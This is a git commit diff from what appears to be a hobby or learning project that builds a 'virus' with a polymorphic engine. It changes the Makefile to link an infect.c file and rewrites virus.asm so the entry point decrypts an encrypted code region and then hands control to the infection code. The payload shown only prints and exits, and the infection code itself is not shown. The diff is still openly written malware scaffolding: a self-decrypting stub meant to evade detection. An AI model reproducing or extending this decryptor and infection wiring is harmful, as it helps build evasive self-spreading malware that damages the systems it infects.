020311be1a56a571d1175915a275fe9909fe9154
Deepak Tivari <deepak.tivari@gmail.com>
2019-05-13 08:36:31 +0800

    able to execute external virus; needs to test poly

--- Makefile
+++ Makefile
@@ -1,20 +1,21 @@
 ASM = nasm
 
 GCC = g++
+CC = gcc
 
-AFLAGS = -felf64 -g -F dwarf
+AFLAGS = -felf64 -g -F dwarf 
 
-CFLAGS = -c -Wall -O2 -g
+CFLAGS = -c  -Wall -O2 -g
 
-LFLAGS = -no-pie
-
+LFLAGS = -no-pie 
+KFLAGS = -no-pie -nostartfiles -m64 -g
 all: virus polymake
 
 polymake: polyengine.o polymorphicengine.o
 	$(GCC) $(LFLAGS) $^ -o $@
 	
-virus: virus.o
-	$(GCC) $(LFLAGS) $< -o $@
+virus:  infect.c virus.o 
+	$(CC) $(KFLAGS) $^ -o $@
 
 virus.o: virus.asm template.asm.inc
 	$(ASM) $(AFLAGS) $< -o $@
--- virus.asm
+++ virus.asm
@@ -1,21 +1,58 @@
 %include "template.asm.inc"
+extern main
+global _start
 
 ; Define variables in the data section
 section .data
 	hello:     db 'Hello world!',10
 	helloLen:  equ $-hello
 
-; Code goes in the text section
-section .text
-	global main
+align 16
+_start:             ; Global entry point
 
-main:
+	; ; save variables to stack for calling main later
+
+	;rbx never changes after decrypt function call, so store rsp there
+	;do this the first action to preserve integrity of rsp as the value of rsp will change every instruction parsed
+	mov rbx, rsp
+
+	; create space to save state in rsp
+	push rbp
+	mov  rbp, rsp
+	sub  rsp, 0x18
+
+	;save data initial program state
+	mov [rbp-0x18],	rdi 
+	mov [rbp-0x10],	rsi
+
     call decrypt
-    call payload
-    ret
+
+	; reload the initial program, state
+	mov rdi, [rbp-0x18]
+	mov rsi, [rbp-0x10]
+	mov rsp, rbx
+
+	; DO NOT TOUCH CALLING MAIN
+	xor rbp, rbp
+	pop rdi
+	mov rsi, rsp
+	lea rdx, [rsp+rdi+8*8]
+	push rdi
+	call main
+	
+	mov rdi, rax
+	mov eax, 1
+	int 80h
+
+
+
+; _start:   
+    ; call decrypt
+    ; call payload
+    ; ret
 
 decrypt:
-    DECRYPTOR_SECTION payload, payload.end-payload
+    DECRYPTOR_SECTION main, 100h
     ret
 
 align 16
@@ -30,5 +67,6 @@ payload:
 	mov eax,1            ; 'exit' system call
 	mov ebx,0            ; exit with error code 0
 	int 80h              ; call the kernel
+
 align 16
 .end:
